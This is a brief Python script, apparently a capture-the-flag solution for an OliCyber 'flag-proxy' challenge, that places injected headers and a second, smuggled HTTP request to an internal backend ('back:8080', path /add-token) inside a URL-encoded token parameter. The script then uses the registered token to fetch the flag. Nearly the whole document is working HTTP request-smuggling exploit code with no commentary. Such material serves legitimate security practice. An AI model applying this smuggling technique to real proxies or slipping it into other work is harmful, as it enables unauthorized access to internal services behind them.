#!/usr/bin/env python3
import requests, urllib.parse, os, json

SITE = "http://flag-proxy.challs.olicyber.it/"
TOKEN = os.urandom(10).hex()
PAYLOAD = \
f'''{TOKEN}
Content-Length: 0
Connection: keep-alive

GET /add-token?token={TOKEN} HTTP/1.0
Host: back:8080
'''
requests.get(SITE + 'flag?token=' + urllib.parse.quote(PAYLOAD))
r = requests.get(SITE + 'flag?token='+ TOKEN)
print(json.loads(r.text)['body'])